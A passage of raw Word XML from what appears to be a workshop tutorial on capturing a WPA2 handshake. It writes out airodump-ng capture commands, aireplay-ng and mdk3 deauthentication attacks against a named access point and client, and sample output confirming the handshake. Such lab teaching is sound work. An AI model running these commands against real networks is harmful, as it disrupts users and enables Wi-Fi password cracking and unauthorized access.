      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">:~# </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airmon-zc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan0 6 </w:t>
      </w:r>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0DF"/>
      </w:r>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>channel 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CC9E48"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p>
    <w:p w14:paraId="25E102A7" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00031C10" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Let’s find a wireless network that uses WPA2 / </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>PSK :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="442F99FC" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="001565B0"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>root@bt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">:~# </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>essid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-regex BSIDESDC*</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71331FCD" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="001565B0"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5157F1B5"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E09EDF" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00031C10" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Stop </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> and run it again, writing all packets to </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>disk :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="053B9CFE" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="001565B0"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon --channel 10 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:19:5B:52:AD:F7 -w /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/wpa2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B0276CB" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08941E45" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3559EC59" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00E40A9F" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E40A9F">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>DEAUTH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CCDD69" w14:textId="77777777" w:rsidR="002B0795" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">We need the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the AP (-a) and the mac of a connected client (-c)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F56DF22" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="008274A1" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve">         Access Point</w:t>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:tab/>
        <w:t>Client</w:t>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BAFAF6" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="001565B0"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -0 1 -a 00:19:5B:52:AD:F7 -c 00:1C:BF:90:5B:A3 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3A8084" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="001565B0"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="416116EE" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="001565B0"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b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>mdk3</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001565B0">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon d –c 11</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B96D2C"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20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="189DFA1E" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="008274A1" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">As a result, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> should indicate “WPA Handshake:” in the upper right corner</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F910F29"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CH </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>10 ]</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">[ Elapsed: 2 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>mins</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> ][ 2009-02-21 13:04 ][ </w:t>
      </w:r>
      <w:r w:rsidRPr="00C01409">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>WPA handshake: 00:19:5B:52:AD:F7</w:t>
      </w:r>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                                         </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFF95EC"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A276CA8"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BSSID              PWR </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>RXQ  Beacons</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15802E7E"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718459DC"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00:19:5B</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>:52:AD:F7</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  -33 100     1338       99    0  10  54   WPA2 CCMP   PSK  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>TestNet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                                              </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D782EB3"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A48AE2"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BSSID              STATION            PWR   Rate   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>Lost  Packets</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  Probe                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7170AB55"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A69D4AB"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 xml:space="preserve"> 00:19:5B</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t>:52:AD:F7</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  00:1C:BF:90:5B:A3  -27  54-54      0      230 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1910501B" w14:textId="77777777" w:rsidR="002B0795" w:rsidRPr="00031C10" w:rsidRDefault="002B0795" w:rsidP="002B0795">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Stop </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00031C10">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> and make sure the files were created properly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21DDE730"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FF0000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>root@bt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008274A1">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">:/# </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FC4D3D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FC4D3D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FC4D3D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00FC4D3D">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/wpa2* -al</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58FAEBEF"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
